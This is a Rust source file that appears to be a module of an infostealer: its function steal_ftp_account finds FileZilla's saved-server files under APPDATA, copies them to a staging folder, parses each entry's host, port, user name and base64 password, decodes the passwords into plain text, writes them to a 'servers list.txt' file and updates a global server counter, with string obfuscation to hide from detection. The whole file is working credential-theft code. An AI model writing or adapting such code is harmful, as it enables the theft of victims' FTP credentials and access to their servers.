use base64;
use quick_xml::events::Event;
use quick_xml::Reader;
use std::fs;

#[allow(deprecated)]
pub fn steal_ftp_account(path: String) -> Option<String> {
    let appdata_path = match std::env::var(obfstr::obfstr!("APPDATA")) {
        Ok(path) => path,
        Err(_) => return None,
    };
    let filezilla_path = format!("{appdata_path}\\{}", obfstr::obfstr!("FileZilla"));

    if std::path::Path::new(&filezilla_path).exists() {
        let _ = std::fs::create_dir(format!("{path}\\{}\\", obfstr::obfstr!("FTP")));

        let recentservers_path =
            format!("{filezilla_path}\\{}", obfstr::obfstr!("recentservers.xml"));
        let sitemanager_path = format!("{filezilla_path}\\{}", obfstr::obfstr!("sitemanager.xml"));

        if std::path::Path::new(&recentservers_path).exists() {
            std::fs::copy(
                &recentservers_path,
                &format!(
                    "{path}\\{}\\{}",
                    obfstr::obfstr!("FTP"),
                    obfstr::obfstr!("recentservers.xml")
                ),
            )
            .ok()?;
        }

        if std::path::Path::new(&sitemanager_path).exists() {
            std::fs::copy(
                &sitemanager_path,
                &format!(
                    "{path}\\{}\\{}",
                    obfstr::obfstr!("FTP"),
                    obfstr::obfstr!("sitemanager.xml")
                ),
            )
            .ok()?;
        }

        let mut server_count = 0;  // New counter to ensure correct count of servers

        let mut ftp_servers = String::new();
        for file in &[&recentservers_path, &sitemanager_path] {
            if let Ok(xml) = fs::read_to_string(file) {
                let mut reader = Reader::from_str(&xml);
                reader.trim_text(true);
                let mut buf = Vec::new();
                let mut name = String::new();
                let mut host = String::new();
                let mut port = String::new();
                let mut user = String::new();
                let mut pass = String::new();
                loop {
                    match reader.read_event(&mut buf) {
                        Ok(Event::Start(ref ftp)) => match ftp.name() {
                            b"Name" => {
                                name = reader
                                    .read_text(ftp.name(), &mut Vec::new())
                                    .unwrap_or_default()
                            }
                            b"Host" => {
                                host = reader
                                    .read_text(ftp.name(), &mut Vec::new())
                                    .unwrap_or_default()
                            }
                            b"Port" => {
                                port = reader
                                    .read_text(ftp.name(), &mut Vec::new())
                                    .unwrap_or_default()
                            }
                            b"User" => {
                                user = reader
                                    .read_text(ftp.name(), &mut Vec::new())
                                    .unwrap_or_default()
                            }
                            b"Pass" => {
                                pass = reader
                                    .read_text(ftp.name(), &mut Vec::new())
                                    .unwrap_or_default()
                            }
                            _ => (),
                        },
                        Ok(Event::End(ref ftp)) if ftp.name() == b"Server" => {
                            let pass_decoded = base64::decode(pass.as_bytes())
                                .ok()
                                .and_then(|v| String::from_utf8(v).ok())
                                .unwrap_or_default();
                            ftp_servers.push_str(&format! ("\n====FileZilla====\nName: {}\nHost: {}\nPort: {}\nUser: {}\nPassword: {}",name, host, port, user, pass_decoded));
                            server_count += 1;  // Increment the server count for each server
                        }
                        Ok(Event::Eof) => {
                            break;
                        }
                        _ => (),
                    }
                    buf.clear();
                }
            }
        }

        // Update the SERVERS count with the correct server count
        unsafe {
            crate::SERVERS += server_count;
        }

        fs::write(
            format!(
                "{path}\\{}\\{}",
                obfstr::obfstr!("FTP"),
                obfstr::obfstr!("servers list.txt")
            ),
            ftp_servers,
        )
        .ok()?;
    }
    Some("FileZilla".to_string())
}
